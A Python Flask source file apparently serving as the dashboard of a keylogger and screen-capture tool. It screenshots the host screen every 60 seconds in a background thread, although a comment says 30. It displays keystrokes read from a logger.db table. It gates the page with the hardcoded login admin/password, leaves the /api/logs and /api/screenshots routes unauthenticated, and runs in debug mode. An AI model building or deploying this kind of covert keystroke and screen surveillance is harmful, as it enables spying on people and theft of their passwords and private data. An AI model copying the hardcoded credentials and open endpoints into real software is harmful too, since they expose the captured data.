from flask import Flask, render_template, jsonify, request, redirect, url_for, session
import sqlite3
import os
import pyautogui
import time
import threading

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Needed for session management

screenshot_folder = "static/screenshots/"
if not os.path.exists(screenshot_folder):
    os.makedirs(screenshot_folder)

def capture_screenshot():
    while True:
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        screenshot_path = os.path.join(screenshot_folder, f"{timestamp}.png")
        pyautogui.screenshot(screenshot_path)
        time.sleep(60)  # Takes a screenshot every 30 seconds

# Start screenshot capturing in a separate thread
screenshot_thread = threading.Thread(target=capture_screenshot, daemon=True)
screenshot_thread.start()

# Fetch logs from database
def get_logs():
    conn = sqlite3.connect("logger.db")
    cursor = conn.cursor()
    cursor.execute("SELECT timestamp, key FROM logs ORDER BY id DESC")
    logs = cursor.fetchall()
    conn.close()
    return logs

# Fetch screenshot files
def get_screenshots():
    return sorted(os.listdir(screenshot_folder), reverse=True)

@app.route('/')
def index():
    if 'username' not in session:
        return redirect(url_for('login'))
    logs = get_logs()
    screenshots = get_screenshots()
    return render_template("index.html", logs=logs, screenshots=screenshots)

@app.route('/api/logs')
def api_logs():
    return jsonify(get_logs())

@app.route('/api/screenshots')
def api_screenshots():
    return jsonify(get_screenshots())

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == 'admin' and password == 'password':  # Change this to secure authentication
            session['username'] = username
            return redirect(url_for('index'))
        else:
            error = "Invalid username or password"
    return render_template("login.html", error=error)

@app.route('/logout')
def logout():
    session.pop('username', None)
    return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(debug=True)
